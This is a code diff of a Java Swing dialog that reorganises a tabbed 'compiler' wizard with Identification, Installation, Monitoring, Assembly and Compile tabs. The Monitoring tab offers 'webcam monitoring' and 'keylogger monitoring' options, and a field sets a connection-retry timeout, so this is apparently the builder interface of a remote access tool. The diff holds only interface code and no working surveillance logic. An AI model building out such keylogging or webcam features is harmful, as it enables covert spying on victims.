@@ -3,19 +3,152 @@ package GUI.Compiler;
 import com.formdev.flatlaf.FlatDarkLaf;
 
 import javax.swing.*;
+import javax.swing.event.ChangeEvent;
+import javax.swing.event.ChangeListener;
 import java.awt.*;
 import java.awt.event.FocusEvent;
 import java.awt.event.FocusListener;
 
 public class CompilerGUI {
-    public CompilerGUI() {
-        JDialog dialog = new JDialog();
-        dialog.setModal(true);
-        dialog.setSize(400, 275);
-        dialog.setLocationRelativeTo(null);
-        dialog.setResizable(false);
+    JTabbedPane tabPane;
+    JDialog dialog;
+    private final GridBagConstraints constraints = new GridBagConstraints();
 
-        JTabbedPane tabPane = new JTabbedPane();
+    public CompilerGUI() {
+        dialog = new JDialog();
+        dialog.setModal(true);
+        dialog.setSize(450, 275);
+        dialog.setLocationRelativeTo(null);
+        dialog.setLayout(new GridBagLayout());
+        addTabbedPane();
+        addLowerPanel();
+        dialog.setVisible(true);
+
+    }
+
+    private void addTabbedPane() {
+        tabPane = new JTabbedPane();
+        addIdentificationPanel();
+        addInstallationPanel();
+        addMonitorPanel();
+        addAssemblyPanel();
+        addCompilePanel();
+        constraints.gridx = 0;
+        constraints.gridy = 0;
+        constraints.gridwidth = 1;
+        constraints.gridheight = 1;
+        constraints.fill = GridBagConstraints.BOTH;
+        constraints.weighty = 1.0;
+        constraints.weightx = 1.0;
+        dialog.add(tabPane, constraints);
+    }
+
+    private void addLowerPanel() {
+        Cursor handCursor = new Cursor(Cursor.HAND_CURSOR);
+        JPanel lowerPanel = new JPanel();
+        lowerPanel.setBackground(new Color(57, 60, 62));
+        lowerPanel.setLayout(new FlowLayout(FlowLayout.RIGHT));
+        JButton goBackButton = new JButton("< Back ");
+        goBackButton.setVisible(false);
+        goBackButton.setBackground(new Color(26, 33, 42));
+        goBackButton.addActionListener(e -> tabPane.setSelectedIndex(tabPane.getSelectedIndex() - 1));
+        lowerPanel.add(goBackButton);
+        JButton compileButton = new JButton("Compile");
+        compileButton.setVisible(false);
+        compileButton.setCursor(handCursor);
+        compileButton.setBackground(new Color(0, 136, 6));
+        compileButton.addActionListener(e -> System.out.println("Start compiling"));
+        lowerPanel.add(compileButton);
+
+        JButton nextButton = new JButton("Next >");
+        nextButton.setCursor(handCursor);
+        nextButton.setBackground(new Color(23, 32, 42));
+        nextButton.addActionListener(e -> tabPane.setSelectedIndex(tabPane.getSelectedIndex() + 1));
+        lowerPanel.add(nextButton);
+        tabPane.addChangeListener(e -> {
+            switch (tabPane.getSelectedIndex()) {
+                case 0 -> {
+                    compileButton.setVisible(false);
+                    goBackButton.setVisible(false);
+                    nextButton.setVisible(true);
+                }
+                case 1, 2, 3 -> {
+                    goBackButton.setVisible(true);
+                    nextButton.setVisible(true);
+                    compileButton.setVisible(false);
+                }
+                case 4 -> {
+                    nextButton.setVisible(false);
+                    compileButton.setVisible(true);
+                }
+            }
+        });
+        constraints.gridx = 0;
+        constraints.gridy = 1;
+        constraints.gridwidth = 1;
+        constraints.gridheight = 1;
+        constraints.fill = GridBagConstraints.HORIZONTAL;
+        constraints.weighty = 0.0;
+        dialog.add(lowerPanel, constraints);
+    }
+
+    private void addCompilePanel() {
+        JPanel compilePanel = new JPanel();
+        compilePanel.setLayout(null);
+
+        JLabel tagLabel = new JLabel("Compile spec:");
+        tagLabel.setBounds(10, 10, 210, 20);
+        compilePanel.add(tagLabel);
+        tabPane.add(compilePanel, "Compile");
+    }
+
+
+    private void addAssemblyPanel() {
+        JPanel assemblyPanel = new JPanel();
+        assemblyPanel.setLayout(null);
+
+        JLabel tagLabel = new JLabel("Assembly spec:");
+        tagLabel.setBounds(10, 10, 210, 20);
+        assemblyPanel.add(tagLabel);
+        tabPane.add(assemblyPanel, "Assembly");
+
+
+    }
+
+
+    private void addMonitorPanel() {
+        JPanel monitorPanel = new JPanel();
+        monitorPanel.setLayout(null);
+
+        JCheckBox webcamCheckBox = new JCheckBox("Enable webcam monitoring");
+        webcamCheckBox.setBounds(10, 10, 210, 20);
+        monitorPanel.add(webcamCheckBox);
+
+        JCheckBox keyloggerCheckBox = new JCheckBox("Enable keylogger monitoring");
+        keyloggerCheckBox.setBounds(10, 40, 210, 20);
+        monitorPanel.add(keyloggerCheckBox);
+
+
+        JSeparator lastHorizontalSeparator = new JSeparator();
+        lastHorizontalSeparator.setBounds(0, 170, 400, 5);
+        monitorPanel.add(lastHorizontalSeparator);
+
+        tabPane.add(monitorPanel, "Monitoring");
+    }
+
+    private void addInstallationPanel() {
+        JPanel installationPanel = new JPanel();
+        installationPanel.setLayout(null);
+
+        JLabel tagLabel = new JLabel("Installation spec:");
+        tagLabel.setBounds(10, 10, 210, 20);
+        installationPanel.add(tagLabel);
+        tabPane.add(installationPanel, "Installation");
+
+
+    }
+
+    private void addIdentificationPanel() {
 
         JPanel identificationPanel = new JPanel();
 
@@ -80,18 +213,6 @@ public class CompilerGUI {
         identificationPanel.add(vertical);
 
 
-        JButton nextButton = new JButton("Next >");
-        nextButton.setCursor(new Cursor(Cursor.HAND_CURSOR));
-        nextButton.setBackground(new Color(23, 32, 42));
-        nextButton.setBounds(298, 178, 80, 20);
-        nextButton.addActionListener(e -> tabPane.setSelectedIndex(1));
-        identificationPanel.add(nextButton);
-
-        JSeparator lastHorizontalSeparator = new JSeparator();
-        lastHorizontalSeparator.setBounds(0, 170, 400, 5);
-        identificationPanel.add(lastHorizontalSeparator);
-
-
         JLabel timingLabel = new JLabel("Timeout to retry connection:");
         timingLabel.setBounds(210, 110, 250, 20);
         identificationPanel.add(timingLabel);
@@ -103,37 +224,7 @@ public class CompilerGUI {
         identificationPanel.add(uniteLabel);
 
 
-        // add panel to tab
-        tabPane.addTab("Client identification", identificationPanel);
-
-        JPanel panel2 = new JPanel();
-        tabPane.addTab("Panel 2", panel2);
-
-        //Componentes del panel2
-        JLabel et_p2 = new JLabel("Estas en el panel 2");
-        panel2.add(et_p2);
-
-        JPanel panel3 = new JPanel();
-
-        //Componentes del panel3
-        JLabel et_p3 = new JLabel("Estas en el panel 3");
-        panel3.add(et_p3);
-
-        tabPane.addTab("Panel 3", panel3);
-
-        JPanel panel4 = new JPanel();
-
-        //Componentes del panel4
-        JLabel et_p4 = new JLabel("Estas en el panel 4");
-        panel4.add(et_p4);
-
-        tabPane.addTab("Panel 4", panel4);
-        dialog.add(tabPane);
-
-
-        dialog.setVisible(true);
-
-
+        tabPane.addTab("Identification", identificationPanel);
     }
 
 
